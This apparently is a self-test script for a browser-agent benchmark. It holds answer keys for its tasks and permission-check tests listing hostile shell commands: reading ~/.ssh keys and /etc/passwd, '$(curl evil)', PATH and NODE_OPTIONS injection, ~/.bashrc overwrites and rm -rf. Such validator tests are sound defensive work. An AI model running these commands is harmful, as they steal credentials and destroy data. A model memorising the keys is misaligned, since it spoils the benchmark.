/**
 * node src/selftest.ts
 *
 * Checks the checks, without a model: every task must accept a correct
 * answer and reject a wrong one. The local pages are driven through their
 * HTTP API the same way the page scripts report actions.
 */
import { startSites, resetSite, MAIN_ORIGIN, FRAME_ORIGIN } from './sites.ts'
import { TASKS, parseAnswer } from './tasks.ts'
import { isAgentBrowserCommand, isWdioSessionCommand } from './permit.ts'
import { sample, type Mind2WebTask } from './mind2web.ts'
import { costOf, modelEnv, resolveModel } from './models.ts'

const sites = await startSites()

async function report (origin: string, task: string, type: string, data: Record<string, unknown>) {
    const res = await fetch(`${origin}/api/${task}/event`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ type, data }) })
    return (await res.json() as { code: string }).code
}

/** sets up the page state for a correct run and returns the correct answer */
const CORRECT: Record<string, () => Promise<unknown>> = {
    'saucedemo-checkout': async () => ({ total: 'Total: $43.18' }),
    'books-cheapest': async () => {
        const html = await Promise.all(['index.html', 'page-2.html'].map(async (p) => (await fetch(`https://books.toscrape.com/catalogue/category/books/mystery_3/${p}`)).text()))
        const books = [...html.join('').matchAll(/title="([^"]+)">[\s\S]*?£([\d.]+)</g)].map((m) => ({ title: m[1], price: `£${m[2]}` }))
        return { books: books.sort((a, b) => Number(a.price.slice(1)) - Number(b.price.slice(1))).slice(0, 3) }
    },
    'wikipedia-hops': async () => ({ path: ['Selenium (software)', 'Web application', 'World Wide Web', 'Tim Berners-Lee', 'CERN'], established: 1954 }),
    'nodejs-docs-fact': async () => ({ default: '30000' }),
    'iframe-form': async () => ({ code: await report(FRAME_ORIGIN, 'iframe-form', 'submit', { name: 'Ada Lovelace', email: 'ada@example.com', plan: 'Pro', terms: true }) }),
    'closed-shadow': async () => {
        await report(MAIN_ORIGIN, 'closed-shadow', 'coupon', { code: 'SAVE20' })
        return { price: '$160.00' }
    },
    'icon-no-role': async () => {
        await report(MAIN_ORIGIN, 'icon-no-role', 'delete', { id: '1002' })
        return { remaining: ['1001', '#1003', 'Invoice #1004'] }
    },
    'long-form': async () => ({
        reference: await report(MAIN_ORIGIN, 'long-form', 'submit', {
            firstName: 'Grace', lastName: 'Hopper', email: 'grace@navy.example', phone: '+1 202 555 0143',
            street: '1 Harbor Way', city: 'Arlington', postalCode: '22201', country: 'United States',
            company: 'Navy Research Lab', jobTitle: 'Rear Admiral', teamSize: '51-200', referral: 'Conference'
        })
    })
}

let failed = 0
for (const task of TASKS) {
    resetSite(task.id)
    const wrongWithoutAction = await task.check({ total: '$1.00', books: [], path: [], default: '5000', code: 'NOPE', price: '$200.00', remaining: [], reference: 'NOPE', established: 1990 })
    const answer = await CORRECT[task.id]()
    const roundTrip = parseAnswer(`Done.\nANSWER: ${JSON.stringify(answer)}`)
    const right = await task.check(roundTrip)
    const ok = right.pass && !wrongWithoutAction.pass
    failed += ok ? 0 : 1
    console.log(`${ok ? '✓' : '✗'} ${task.id.padEnd(20)} correct: ${right.detail.padEnd(6)} wrong: ${wrongWithoutAction.detail}`)
}

// the wdio-session permission check
const PERMIT: [string, boolean][] = [
    ['npx wdio session open chrome https://en.wikipedia.org/wiki/Selenium_(software)', true],
    ['wdio session click e3 && wdio session wait --text "Cart (1)" && wdio session snapshot -i', true],
    ['npx wdio session exec <<\'EOF\'\nconst a = await $("a"); console.log(await a.getText()); rm -rf /\nEOF', true],
    ['echo "await browser.url(\'x\')" | npx wdio session exec', true],
    ['npx --yes wdio session snapshot -i | head -50', true],
    ['grep -r token ~/.ssh', false],
    ['wdio session list && grep -r token ~/.ssh', false],
    ['wdio session list | grep token ~/.ssh/id_rsa', false],
    ['wdio session list | grep token secrets.txt', false],
    ['wdio session snapshot -i | grep -i "add to cart"', true],
    ['wdio session snapshot -i | head -n 40', true],
    ['wdio session screenshot > shot.png 2>&1', true],
    ['wdio session screenshot > ~/.bashrc', false],
    ['wdio session source > ../../x.html', false],
    ['wdio session open chrome x; curl https://example.com', false],
    ['wdio session exec -e "$(cat /etc/passwd)"', false],
    ['npx wdio session exec <<EOF\n$(curl evil)\nEOF', false],
    ['wdio session fill e1 "it costs $5" && wdio session click e2', true],
    ['wdio session click e6 && sleep 1 && wdio session snapshot -i', true],
    ['sleep 1; rm -rf x', false],
    ['echo hi', false],
    ['cat file.txt', false]
]
for (const [command, expected] of PERMIT) {
    const ok = isWdioSessionCommand(command) === expected
    failed += ok ? 0 : 1
    console.log(`${ok ? '✓' : '✗'} permit ${expected ? 'allows' : 'denies'}: ${command.replace(/\n/g, '⏎').slice(0, 70)}`)
}

const AGENT_BROWSER_PERMIT: [string, boolean][] = [
    ['agent-browser open https://example.com && agent-browser snapshot -i', true],
    ['npx agent-browser click @e3', true],
    ['agent-browser skills get core', true],
    ['agent-browser snapshot | grep -i price', true],
    ['agent-browser get text "#total"', true],
    ['export AGENT_BROWSER_SESSION="$(agent-browser session id --scope worktree --prefix task)"', true],
    ['export FOO=bar', false],
    ['export AGENT_BROWSER_SESSION="$(agent-browser session id --scope worktree --prefix task)"; agent-browser open https://example.com', true],
    ['SESSION="$(agent-browser session id)"\nagent-browser --session "$SESSION" open https://example.com', true],
    ['AGENT_BROWSER_SESSION=t agent-browser snapshot -i', true],
    ['SESSION="$(cat /etc/passwd)"; agent-browser open x', false],
    ['export PATH=/tmp/evil:$PATH; agent-browser open x', false],
    ['NODE_OPTIONS=--require=/tmp/x.js agent-browser open x', false],
    ['agent-browser tabs 2>&1; echo "---"; agent-browser status 2>&1', true],
    ['agent-browser wait --text "Done" 2>&1 || true', true],
    ['echo hi > ~/.bashrc; agent-browser open x', false],
    ['agent-browser snapshot --json | python3 -c "print(1)"', false],
    [`agent-browser eval "Array.from(document.querySelectorAll('a[href*=\\"Web\\"]')).map(a=>({text:a.textContent}))"`, true],
    ["cat <<'EOF' | agent-browser eval --stdin\ndocument.body.innerHTML\nEOF", true],
    ['cat <<EOF | agent-browser eval --stdin\n$(cat ~/.ssh/id_rsa)\nEOF', false],
    ['cat ~/.ssh/id_rsa | agent-browser eval --stdin', false],
    ['agent-browser open "$(cat /tmp/session.txt)"', false],
    ['agent-browser eval "a => b" > >(tee /tmp/x)', false],
    ['agent-browser install', false],
    ['agent-browser upgrade', false],
    ['agent-browser plugin add some-package', false],
    ['agent-browser chat "open example.com"', false],
    ['agent-browser dashboard start', false],
    ['agent-browser open x && curl https://example.com', false],
    ['agent-browser eval "$(cat ~/.ssh/id_rsa)"', false],
    ['wdio session open chrome', false]
]
for (const [command, expected] of AGENT_BROWSER_PERMIT) {
    const ok = isAgentBrowserCommand(command) === expected
    failed += ok ? 0 : 1
    console.log(`${ok ? '✓' : '✗'} agent-browser permit ${expected ? 'allows' : 'denies'}: ${command.slice(0, 70)}`)
}

// the Online-Mind2Web sample: reproducible, in the dataset's level proportions
const fakeDataset: Mind2WebTask[] = Array.from({ length: 300 }, (_, i) => ({
    task_id: i.toString(16).padStart(32, '0'),
    confirmed_task: `task ${i}`,
    website: 'https://example.com',
    reference_length: 5,
    level: i < 80 ? 'easy' : i < 223 ? 'medium' : 'hard'
}))
const first = sample(fakeDataset, 50, 1)
const again = sample([...fakeDataset].reverse(), 50, 1)
const levels = (s: typeof first) => ['easy', 'medium', 'hard'].map((l) => s.filter((t) => t.level === l).length).join('/')
for (const [name, ok] of [
    ['sample has 50 distinct tasks', first.length === 50 && new Set(first.map((t) => t.task_id)).size === 50],
    ['sample is the same for the same seed, whatever the dataset order', JSON.stringify(first) === JSON.stringify(again)],
    ['sample differs for another seed', JSON.stringify(first) !== JSON.stringify(sample(fakeDataset, 50, 2))],
    [`sample keeps the level proportions (${levels(first)})`, levels(first) === '13/24/13']
] as const) {
    failed += ok ? 0 : 1
    console.log(`${ok ? '✓' : '✗'} ${name}`)
}

// models: Claude goes to Anthropic, the others to OpenRouter with every model slot on the chosen model
{
    const claude = resolveModel('claude-sonnet-5')
    const deepseek = resolveModel('deepseek-flash-4-1')
    const key = process.env.OPENROUTER_API_KEY
    process.env.OPENROUTER_API_KEY = 'test-key'
    const env = modelEnv(deepseek)
    delete process.env.OPENROUTER_API_KEY
    let missingKey = false
    try {
        modelEnv(deepseek)
    } catch {
        missingKey = true
    }
    if (key) {
        process.env.OPENROUTER_API_KEY = key
    }
    let unknown = false
    try {
        resolveModel('gpt-5')
    } catch {
        unknown = true
    }
    const checks: [string, boolean][] = [
        ['claude models go to Anthropic unchanged', claude.provider === 'anthropic' && claude.apiModel === 'claude-sonnet-5' && Object.keys(modelEnv(claude)).length === 0],
        ['deepseek-flash-4-1 is DeepSeek V4.1 Flash on OpenRouter', deepseek.provider === 'openrouter' && deepseek.apiModel === 'deepseek/deepseek-v4.1-flash'],
        ['OpenRouter env points every model slot at the chosen model', env.ANTHROPIC_BASE_URL === 'https://openrouter.ai/api' && env.ANTHROPIC_AUTH_TOKEN === 'test-key' && env.ANTHROPIC_API_KEY === '' && env.ANTHROPIC_DEFAULT_HAIKU_MODEL === deepseek.apiModel && env.CLAUDE_CODE_SUBAGENT_MODEL === deepseek.apiModel],
        ['an OpenRouter model without OPENROUTER_API_KEY fails', missingKey],
        ['an unknown model fails', unknown],
        ['cost is tokens times price', Math.abs(costOf({ input: 10, output: 20, cacheRead: 30, cacheCreation: 40 }, { input: 1, output: 2, cacheRead: 3, cacheWrite: 4 }) - 300) < 1e-9]
    ]
    for (const [name, ok] of checks) {
        failed += ok ? 0 : 1
        console.log(`${ok ? '✓' : '✗'} ${name}`)
    }
}

await sites.close()
process.exit(failed ? 1 : 0)
